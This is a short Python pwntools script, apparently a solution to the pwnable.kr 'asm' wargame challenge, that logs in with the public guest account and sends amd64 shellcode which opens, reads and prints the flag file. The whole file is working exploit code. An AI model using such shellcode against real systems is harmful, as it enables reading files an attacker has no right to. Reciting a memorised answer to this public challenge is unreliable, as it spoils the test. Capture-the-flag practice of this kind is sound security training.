from pwn import *


# This stub code just clears all the registers
# print(disasm("\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff", arch = 'amd64'))

filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

# print shellcraft.amd64.pushstr(filename)
# print asm(pwnlib.shellcraft.amd64.linux.open("./flag.txt", 1, 1))
# print(shellcraft.amd64.linux.write(1, 'rsp', 8))
# print(shellcraft.amd64.linux.read(1, 'rsp', 8))

con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)

context(arch='amd64', os='linux')

shellcode = shellcraft.pushstr(filename)
shellcode += shellcraft.open('rsp', 0, 0) #file, oflags, varflag
shellcode += shellcraft.mov("r10", "rax")
shellcode += shellcraft.read('r10', 'rsp', 48) # fd, buf, numBytes
shellcode += shellcraft.write(1, 'rsp', 48) # fd, buf, numBytes

# print shellcode
raw_shellcode = asm(shellcode, arch = 'amd64', os = 'linux')
print(repr(raw_shellcode))
print p.recvuntil("give me your x64 shellcode: ")
p.sendline(raw_shellcode)
print p.recvline()
